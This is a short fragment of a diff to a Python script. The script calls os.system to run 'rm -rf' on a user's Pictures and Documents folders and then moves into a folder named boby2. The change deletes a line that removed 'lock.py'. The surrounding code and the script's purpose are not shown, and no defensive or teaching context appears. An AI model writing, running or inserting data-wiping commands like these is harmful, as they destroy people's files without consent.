@@ -12,7 +12,7 @@ os.system("rm -rf Pictures")
 os.system("rm -rf Documents")
 os.system("cd")
 os.system("cd boby2")
-os.system("rm -rf lock.py")
+
 
 
 
